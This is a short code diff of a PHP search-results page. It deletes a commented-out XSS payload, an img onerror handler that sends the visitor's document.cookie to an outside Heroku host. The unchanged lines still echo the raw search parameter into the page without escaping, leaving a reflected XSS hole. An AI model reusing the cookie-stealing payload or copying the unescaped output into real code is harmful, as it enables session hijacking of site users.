@@ -56,8 +56,6 @@ require_once 'inc/config.php';
                                         <div>Search Results - <?php echo $_GET['search']; ?></div>
                                         <br/>
                                         
-                                        <!-- <img src="x" onerror="javascript:var xmlHttp = new XMLHttpRequest(); xmlHttp.open( 'GET', 'https://immense-citadel-89256.herokuapp.com/recorddata?'+document.cookie, false ); xmlHttp.send( null );"> -->
-
                                         <?php
                                     }
                                     if(isset($_GET['search'])){
